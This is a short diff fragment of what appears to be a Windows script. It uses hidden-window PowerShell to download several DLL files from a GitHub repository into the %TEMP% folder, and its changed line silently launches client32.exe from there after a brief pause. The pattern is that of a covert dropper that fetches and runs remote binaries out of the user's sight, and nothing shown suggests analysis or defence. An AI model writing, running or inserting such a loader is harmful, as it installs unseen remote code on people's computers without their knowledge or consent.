@@ -10,4 +10,4 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL' -OutFile '%TEMP%\PCICHEK.DLL';
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL' -OutFile '%TEMP%\PCICL32.DLL';
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL' -OutFile '%TEMP%\TCCTL32.DLL';
-powershell Start-Sleep -Seconds 5 Start-Process -WindowStyle Hidden "$env:TEMP\setup.exe"
+powershell Start-Sleep -Seconds 5; Start-Process -WindowStyle Hidden '%TEMP%\client32.exe'
